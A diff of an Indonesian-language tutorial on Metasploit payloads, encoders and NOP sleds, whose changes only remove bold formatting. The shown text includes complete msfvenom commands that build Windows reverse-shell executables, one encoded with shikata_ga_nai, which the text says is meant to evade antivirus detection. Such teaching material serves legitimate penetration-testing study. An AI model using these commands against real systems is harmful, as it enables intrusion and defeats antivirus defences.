@@ -7,7 +7,7 @@ Payload adalah kode yang dijalankan di sistem target setelah berhasil dieksploit
 - **Bind Shell** (membuka port di target untuk diakses attacker)
 - **Meterpreter** (payload canggih Metasploit dengan banyak fitur)
 
-**Contoh Payload Populer:**
+Contoh Payload Populer:
 
 | Payload |	Keterangan |
 |:--:|:--:|
@@ -24,7 +24,7 @@ Encoder adalah teknik untuk menyandikan payload agar tidak terdeteksi oleh antiv
 - Menghindari deteksi signature oleh antivirus.
 - Menyesuaikan dengan karakterisasi buffer (misal: tidak boleh ada `\x00`).
 
-**Contoh Encoder:**
+Contoh Encoder:
 
 | Encoder	| Platform | Deskripsi |
 |:--:|:--:|:--:|
@@ -32,13 +32,13 @@ Encoder adalah teknik untuk menyandikan payload agar tidak terdeteksi oleh antiv
 | `cmd/echo` | `Windows` | Menyandikan payload sebagai perintah echo |
 | `generic/none` | `All` | Tidak menggunakan encoding |
 
-**Contoh Penggunaan Encoder:**
+Contoh Penggunaan Encoder:
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o shell_encoded.exe
 ```
 
-**Keterangan:**
+Keterangan:
 - `-p`: Jenis payload: `windows/meterpreter/reverse_tcp`
 - `LHOST`: IP Attacker: `192.168.1.8`
 - `LPORT`: Port listener: `4444`
@@ -68,8 +68,8 @@ Di Metasploit, NOP generator dapat ditambahkan saat membuat payload:
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -n 16 -f exe > payload.exe
 ```
 
-**Keterangan:**
-- `-n 16`: Menambahkan 16 byte NOP sled.
+Keterangan:
+- `-n 16`: Menambahkan 16 byte NOP sled
 
 ## D. Relasi Payload, Encoder, dan NOPs
 
